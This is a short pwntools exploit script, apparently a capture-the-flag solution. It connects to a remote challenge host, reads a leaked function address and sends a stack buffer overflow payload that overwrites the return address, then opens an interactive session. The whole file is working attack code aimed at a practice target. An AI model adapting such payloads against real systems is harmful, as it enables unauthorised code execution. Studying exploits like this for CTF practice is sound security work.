from pwn import *
p = remote('node3.buuoj.cn',27268)
#p = process('./pwn')
context.log_level='debug'
p.recvuntil('0x')
sys_addr = int(p.recv(6),16)
print hex(sys_addr)
payload = 'A'*0x40 + 'A'*0x08 + p64(sys_addr)
p.sendlineafter('>',payload)
p.interactive()